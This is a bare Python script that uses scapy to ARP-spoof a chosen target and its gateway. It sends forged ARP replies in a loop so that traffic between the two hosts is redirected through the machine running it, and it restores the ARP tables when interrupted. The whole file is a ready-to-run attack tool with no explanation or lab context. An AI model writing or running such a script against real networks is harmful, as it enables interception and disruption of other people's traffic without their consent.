import scapy.all as scapy
import argparse
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify gateway IP")
    return parser.parse_args()

def send_arp_request(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def flood_arp(target_ip, gateway_ip):
    try:
        while True:
            send_arp_request(target_ip, gateway_ip)
            send_arp_request(gateway_ip, target_ip)
    except KeyboardInterrupt:
        print("\n[-] Ctrl + C detected.....Stopping the ARP flood attack.")
        restore_arp_tables(target_ip, gateway_ip)
        restore_arp_tables(gateway_ip, target_ip)

def restore_arp_tables(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

arguments = get_arguments()
flood_arp(arguments.target, arguments.gateway)
